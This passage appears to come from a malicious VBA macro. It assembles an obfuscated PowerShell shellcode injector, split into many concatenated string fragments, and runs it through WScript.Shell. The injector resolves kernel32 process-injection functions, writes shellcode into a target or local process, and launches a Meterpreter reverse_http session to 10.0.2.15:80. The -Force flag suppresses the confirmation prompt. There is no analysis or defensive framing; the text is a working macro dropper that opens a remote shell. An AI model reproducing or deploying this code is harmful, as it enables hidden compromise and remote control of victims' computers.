        SmIco = SmIco + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        SmIco = SmIco + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        SmIco = SmIco + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        SmIco = SmIco + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        SmIco = SmIco + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        SmIco = SmIco + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        SmIco = SmIco + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        SmIco = SmIco + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        SmIco = SmIco + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        SmIco = SmIco + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        SmIco = SmIco + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        SmIco = SmIco + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        SmIco = SmIco + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        SmIco = SmIco + "ernel32.dll WriteProcessMemory
        $WriteProce"
        SmIco = SmIco + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        SmIco = SmIco + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        SmIco = SmIco + "()) ([Bool])
        $WriteProcessMemory = [System"
        SmIco = SmIco + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        SmIco = SmIco + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        SmIco = SmIco + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        SmIco = SmIco + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        SmIco = SmIco + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        SmIco = SmIco + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        SmIco = SmIco + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        SmIco = SmIco + "eateRemoteThread = [System.Runtime.InteropServices"
        SmIco = SmIco + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        SmIco = SmIco + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        SmIco = SmIco + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        SmIco = SmIco + " CloseHandle
        $CloseHandleDelegate = Get-De"
        SmIco = SmIco + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        SmIco = SmIco + "le = [System.Runtime.InteropServices.Marshal]::Get"
        SmIco = SmIco + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        SmIco = SmIco + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        SmIco = SmIco + ".ShouldContinue( 'Do you wish to carry out your ev"
        SmIco = SmIco + "il plans?',
                 "Injecting shellcode "
        SmIco = SmIco + "injecting into $((Get-Process -Id $ProcessId).Proc"
        SmIco = SmIco + "essName) ($ProcessId)!" ) )
        {
            "
        SmIco = SmIco + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        SmIco = SmIco + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        SmIco = SmIco + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        SmIco = SmIco + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        SmIco = SmIco + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        SmIco = SmIco + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        SmIco = SmIco + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        SmIco = SmIco + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        SmIco = SmIco + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        SmIco = SmIco + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        SmIco = SmIco + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        SmIco = SmIco + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        SmIco = SmIco + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        SmIco = SmIco + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        SmIco = SmIco + "rocAddress kernel32.dll CreateThread
        $Crea"
        SmIco = SmIco + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        SmIco = SmIco + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        SmIco = SmIco + "IntPtr])
        $CreateThread = [System.Runtime.I"
        SmIco = SmIco + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        SmIco = SmIco + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        SmIco = SmIco + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        SmIco = SmIco + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        SmIco = SmIco + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        SmIco = SmIco + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        SmIco = SmIco + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        SmIco = SmIco + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        SmIco = SmIco + "ForSingleObjectDelegate)
        if ( $Force -or $"
        SmIco = SmIco + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        SmIco = SmIco + " your evil plans?',
                 "Injecting sh"
        SmIco = SmIco + "ellcode into the running PowerShell process!" ) )
"
        SmIco = SmIco + "        {
            Inject-LocalShellcode
      "
        SmIco = SmIco + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        SmIco = SmIco + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        SmIco = SmIco + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(SmIco)
End Function

